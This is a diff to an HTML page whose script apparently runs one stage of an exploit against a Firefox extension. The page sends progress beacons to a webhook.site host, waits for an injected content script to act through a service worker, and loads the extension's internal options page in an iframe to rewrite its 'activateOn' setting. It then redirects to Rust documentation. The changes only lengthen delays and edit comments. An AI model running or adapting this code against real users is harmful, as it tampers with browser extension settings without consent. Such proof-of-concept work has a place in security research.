@@ -4,13 +4,11 @@
 <body>
   <script>
     async function run() {
-      // Ping Webhook on Stage 2 arrival
       fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');
 
-      // Wait for cs.js to inject and send message to background.js
-      await new Promise(r => setTimeout(r, 1500));
+      // Give cs.js enough time to run, intercept via SW, and send updateLastUrl to background.js
+      await new Promise(r => setTimeout(r, 2500));
 
-      // Reset activateOn back to target origin
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
@@ -23,9 +21,10 @@
 
         fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
 
+        // Allow time for activateOn config to persist
         setTimeout(() => {
           window.location.href = 'https://doc.rust-lang.org/stable/std/';
-        }, 1000);
+        }, 2000);
       };
     }
     run();
